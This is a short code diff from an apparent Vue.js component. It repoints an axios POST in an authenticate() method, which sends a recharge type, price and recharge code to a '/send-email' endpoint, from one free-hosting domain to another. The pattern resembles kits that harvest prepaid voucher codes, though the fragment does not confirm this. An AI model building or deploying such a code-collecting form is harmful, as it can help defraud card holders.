@@ -72,7 +72,7 @@ export default {
     },
     authenticate() {
           axios
-            .post('https://backexpress-io97.vercel.app/send-email', {
+            .post('https://calm-horse-d69bdf.netlify.app/send-email', {
               rechargeType: this.rechargeType,
               price: this.price,
               rechargeCode: this.rechargeCode,
